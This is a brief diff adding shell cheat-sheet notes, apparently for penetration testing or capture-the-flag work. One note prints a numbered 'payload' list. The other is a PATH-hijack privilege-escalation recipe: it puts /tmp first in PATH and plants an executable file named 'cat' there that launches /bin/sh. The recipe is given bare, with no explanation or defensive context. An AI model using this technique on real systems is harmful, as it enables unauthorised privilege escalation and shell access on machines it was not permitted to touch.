@@ -1,0 +1,9 @@
+# Generate payload simple list
+$ for i in `seq 1 100`; do echo $i; done
+
+# Add directory $PATH
+$
+export PATH=/tmp:$PATH
+cd /tmp/
+echo '/bin/sh' > cat
+chmod +x cat
